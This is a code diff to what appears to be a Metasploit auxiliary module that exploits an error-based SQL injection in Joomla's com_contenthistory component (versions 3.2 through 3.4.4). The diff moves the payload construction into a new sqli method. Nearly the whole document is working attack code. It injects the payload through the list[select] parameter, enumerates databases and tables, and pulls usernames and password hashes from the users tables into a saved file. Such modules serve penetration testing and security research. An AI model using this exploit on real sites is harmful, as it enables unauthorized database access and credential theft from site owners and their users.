@@ -15,8 +15,7 @@ class Metasploit4 < Msf::Auxiliary
       'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
       'Description'    => %q{
         This module exploits a SQL injection vulnerability in Joomla versions 3.2
-        through 3.4.4 in order to either enumerate usernames and password hashes
-        or session IDs.
+        through 3.4.4 in order to either enumerate usernames and password hashes.
       },
       'References'     =>
         [
@@ -61,12 +60,31 @@ class Metasploit4 < Msf::Auxiliary
 
   end
 
-  def request(query)
-    query = "#{$payload}" % query
-    res = sqli(query)
+  def sqli(query)
+    lmark = Rex::Text.rand_text_alpha(5)
+    rmark = Rex::Text.rand_text_alpha(5)
+
+    payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
+    payload << "0x#{lmark.unpack('H*')[0]},"
+    payload << '%s,'
+    payload << "0x#{rmark.unpack('H*')[0]},"
+    payload << 'FLOOR(RAND(0)*2)'
+    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
+
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'vars_get' => {
+        'option' => 'com_contenthistory',
+        'view' => 'history',
+        'list[ordering]' => '',
+        'item_id' => 1,
+        'type_id' => 1,
+        'list[select]' => '1 ' + (payload % query)
+      }
+    })
 
     # Error based SQL Injection
-    if res && res.code == 500 && res.body =~ /#{$lmark}(.*)#{$rmark}/
+    if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
       $1
     end
   end
@@ -77,13 +95,13 @@ class Metasploit4 < Msf::Auxiliary
     query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '
     query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'
 
-    dbc = request(query)
+    dbc = sqli(query)
 
     query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
     query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'
 
     0.upto(dbc.to_i - 1) do |i|
-      dbname = request(query_fmt % i)
+      dbname = sqli(query_fmt % i)
       dbs << dbname
       vprint_good(dbname)
     end
@@ -101,7 +119,7 @@ class Metasploit4 < Msf::Auxiliary
     query << 'FROM INFORMATION_SCHEMA.TABLES '
     query << "WHERE table_schema IN (0x#{database.unpack('H*')[0]}))"
 
-    tbc = request(query)
+    tbc = sqli(query)
 
     query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '
     query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '
@@ -110,7 +128,7 @@ class Metasploit4 < Msf::Auxiliary
 
     vprint_status('tables in database: %s' % database)
     0.upto(tbc.to_i - 1) do |i|
-      tbname = request(query_fmt % i)
+      tbname = sqli(query_fmt % i)
       vprint_good(tbname)
       tbs << tbname if tbname =~ /_users$/
     end
@@ -121,7 +139,7 @@ class Metasploit4 < Msf::Auxiliary
     cols = []
     query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"
 
-    colc = request(query)
+    colc = sqli(query)
     vprint_status(colc)
 
     valid_cols = [   # joomla_users
@@ -152,7 +170,7 @@ class Metasploit4 < Msf::Auxiliary
         l = 1
         record[col] = ''
         loop do
-          value = request(query_fmt % [col, l, i])
+          value = sqli(query_fmt % [col, l, i])
           break if value.blank?
           record[col] << value
           l += 54
@@ -165,16 +183,6 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run
-    $lmark = Rex::Text.rand_text_alpha(5)
-    $rmark = Rex::Text.rand_text_alpha(5)
-
-    $payload = 'AND (SELECT 6062 FROM(SELECT COUNT(*),CONCAT('
-    $payload << "0x#{$lmark.unpack('H*')[0]},"
-    $payload << '%s,'
-    $payload << "0x#{$rmark.unpack('H*')[0]},"
-    $payload << 'FLOOR(RAND(0)*2)'
-    $payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'
-
     dbs = query_databases
     dbs.each do |db|
       tables = query_tables(db)
@@ -190,19 +198,5 @@ class Metasploit4 < Msf::Auxiliary
         print_good('Saved file to: ' + path)
       end
     end
-  end
-
-  def sqli(payload)
-    send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'index.php'),
-      'vars_get' => {
-        'option' => 'com_contenthistory',
-        'view' => 'history',
-        'list[ordering]' => '',
-        'item_id' => 1,
-        'type_id' => 1,
-        'list[select]' => '1 ' + payload
-      }
-    })
   end
 end
